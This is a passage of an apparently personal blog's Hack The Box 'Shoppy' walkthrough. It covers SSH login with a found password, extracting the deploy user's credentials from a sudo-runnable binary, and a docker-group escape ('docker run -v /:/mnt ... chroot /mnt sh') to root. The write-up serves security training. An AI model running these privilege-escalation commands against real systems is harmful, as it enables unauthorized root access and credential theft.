+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy]
+</span></span><span class="line"><span class="cl">└─$ ssh jaeger@shoppy.htb                                           
+</span></span><span class="line"><span class="cl">jaeger@shoppy.htb&#39;s password: Sh0ppyBest@pp!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">jaeger@shoppy:~$ whoami
+</span></span><span class="line"><span class="cl">jaeger
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">jaeger@shoppy:~$ ls -al
+</span></span><span class="line"><span class="cl">total 96
+</span></span><span class="line"><span class="cl">drwxr-xr-x 19 jaeger jaeger 4096 Jul 22 15:56 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x  4 root   root   4096 Jul 22 13:12 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  1 jaeger jaeger    9 Jul 22 11:42 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 jaeger jaeger  220 Jul 22 11:39 .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 jaeger jaeger 3723 Jul 22 12:05 .bashrc
+</span></span><span class="line"><span class="cl">drwx------ 14 jaeger jaeger 4096 Jul 22 12:55 .cache
+</span></span><span class="line"><span class="cl">drwx------ 12 jaeger jaeger 4096 Jul 22 13:47 .config
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  1 jaeger jaeger    9 Jul 22 15:56 .dbshell -&gt; /dev/null
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 jaeger jaeger 4096 Jul 22 11:40 Desktop
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 jaeger jaeger 4096 Jul 22 11:40 Documents
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 jaeger jaeger 4096 Jul 22 11:40 Downloads
+</span></span><span class="line"><span class="cl">drwx------  3 jaeger jaeger 4096 Jul 23 03:10 .gnupg
+</span></span><span class="line"><span class="cl">drwxr-xr-x  3 jaeger jaeger 4096 Jul 22 11:40 .local
+</span></span><span class="line"><span class="cl">-rw-------  1 jaeger jaeger    0 Jul 22 15:55 .mongorc.js
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 jaeger jaeger 4096 Jul 22 11:40 Music
+</span></span><span class="line"><span class="cl">drwxr-xr-x  4 jaeger jaeger 4096 Jul 22 12:06 .npm
+</span></span><span class="line"><span class="cl">drwxr-xr-x  5 jaeger jaeger 4096 Jul 22 12:06 .nvm
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 jaeger jaeger 4096 Jul 22 11:40 Pictures
+</span></span><span class="line"><span class="cl">drwxr-xr-x  5 jaeger jaeger 4096 Sep 18 03:50 .pm2
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 jaeger jaeger  807 Jul 22 11:39 .profile
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 jaeger jaeger 4096 Jul 22 11:40 Public
+</span></span><span class="line"><span class="cl">drwxr-xr-x  7 jaeger jaeger 4096 Jul 23 03:42 ShoppyApp
+</span></span><span class="line"><span class="cl">-rwxr--r--  1 jaeger jaeger  130 Jul 22 12:25 shoppy_start.sh
+</span></span><span class="line"><span class="cl">drwx------  2 jaeger jaeger 4096 Jul 22 11:42 .ssh
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 jaeger jaeger 4096 Jul 22 11:40 Templates
+</span></span><span class="line"><span class="cl">-rw-r-----  1 jaeger jaeger   33 Sep 18 03:51 user.txt
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 jaeger jaeger 4096 Jul 22 11:40 Videos
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">jaeger@shoppy:~$ cat user.txt
+</span></span><span class="line"><span class="cl">78****************************bd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Running <code>sudo -l</code> we can run <code>/home/deploy/password-manager</code> as user <code>deploy</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries for jaeger on shoppy:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User jaeger may run the following commands on shoppy:
+</span></span><span class="line"><span class="cl">    (deploy) /home/deploy/password-manager
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The file <code>password-manager</code> is a 64-bit <code>ELF</code> binary.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/10.png" title="password-manager" data-thumbnail="/hackthebox-shoppy/10.png" data-sub-html="<h2>password-manager</h2><p>password-manager</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/10.png"
+            data-srcset="/hackthebox-shoppy/10.png, /hackthebox-shoppy/10.png 1.5x, /hackthebox-shoppy/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/10.png" width="1345" height="59" />
+    </a><figcaption class="image-caption">password-manager</figcaption>
+    </figure></p>
+<p>We can run the binary to analyze it&rsquo;s behavior.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -u deploy /home/deploy/./password-manager
+</span></span><span class="line"><span class="cl">Welcome to Josh password manager!
+</span></span><span class="line"><span class="cl">Please enter your master password: test
+</span></span><span class="line"><span class="cl">Access denied! This incident will be reported !
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upon running the binary, it asks for a password and on giving a wrong password it shows access denied.</p>
+<p>Reading the contents of the binary using <code>cat</code> we can see the password in plain text.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-shoppy/11.png" title="cat password-manager" data-thumbnail="/hackthebox-shoppy/11.png" data-sub-html="<h2>cat password-manager</h2><p>cat password-manager</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-shoppy/11.png"
+            data-srcset="/hackthebox-shoppy/11.png, /hackthebox-shoppy/11.png 1.5x, /hackthebox-shoppy/11.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-shoppy/11.png" width="1344" height="275" />
+    </a><figcaption class="image-caption">cat password-manager</figcaption>
+    </figure></p>
+<p>On entering the password <code>Sample</code>, we get credentials for the user <code>deploy</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -u deploy /home/deploy/./password-manager
+</span></span><span class="line"><span class="cl">Welcome to Josh password manager!
+</span></span><span class="line"><span class="cl">Please enter your master password: Sample
+</span></span><span class="line"><span class="cl">Access granted! Here is creds !
+</span></span><span class="line"><span class="cl">Deploy Creds :
+</span></span><span class="line"><span class="cl">username: deploy
+</span></span><span class="line"><span class="cl">password: Deploying@pp!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">jaeger@shoppy:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Switching to <code>deploy</code> user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jaeger@shoppy:~$ su deploy
+</span></span><span class="line"><span class="cl">Password: Deploying@pp!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">deploy@shoppy:/home/jaeger$ whoami
+</span></span><span class="line"><span class="cl">deploy
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="roottxt">root.txt</h2>
+<p>The <code>id</code> command shows the user <code>deploy</code> is part of the <code>docker</code> group. We can simply run <a href="https://gtfobins.github.io/gtfobins/docker/#shell" target="_blank" rel="noopener noreffer ">this</a> exploit from gtfobins to escalate to root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">deploy@shoppy:/home/jaeger$ id
+</span></span><span class="line"><span class="cl">uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@e79ceb533a94:/# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@e79ceb533a94:/# cat /root/root.txt
+</span></span><span class="line"><span class="cl">e6****************************48
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-01-14</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-shoppy/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-shoppy/" data-title="Hackthebox - Shoppy" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-shoppy/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-shoppy/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/cryptohack-challenges-general-encoding/" class="prev" rel="prev" title="CryptoHack - Challenges - General/Encoding"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CryptoHack - Challenges - General/Encoding</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
